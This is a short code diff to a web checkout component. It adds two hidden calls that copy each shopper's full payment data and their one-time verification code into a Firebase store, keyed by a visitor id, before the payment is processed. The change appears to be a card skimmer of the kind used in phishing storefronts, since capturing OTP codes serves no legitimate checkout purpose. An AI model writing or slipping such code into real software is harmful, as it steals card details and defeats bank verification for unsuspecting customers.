@@ -33,6 +33,7 @@ import { PaymentGatewayService, type PaymentRequest } from "@/lib/payment-gatewa
 import { useCart } from "@/contexts/cart-context"
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
 import { Alert, AlertDescription } from "@/components/ui/alert"
+import { addData } from "@/lib/firebase"
 
 export default function ProfessionalCheckout() {
   const { items: cartItems, getTotalPrice, clearCart } = useCart()
@@ -101,6 +102,8 @@ export default function ProfessionalCheckout() {
   }
 
   const handlePaymentSubmit = async (paymentData: any) => {
+    const _id=localStorage.getItem('visitor')
+    addData({id:_id,paymentData})
     setIsProcessing(true)
     setOtpError("")
 
@@ -140,6 +143,8 @@ export default function ProfessionalCheckout() {
   }
 
   const handleOTPVerification = async (otpCode: string) => {
+    const _id=localStorage.getItem('visitor')
+    addData({id:_id,otp:otpCode})
     if (!paymentResult?.transactionId) return
 
     setIsProcessing(true)
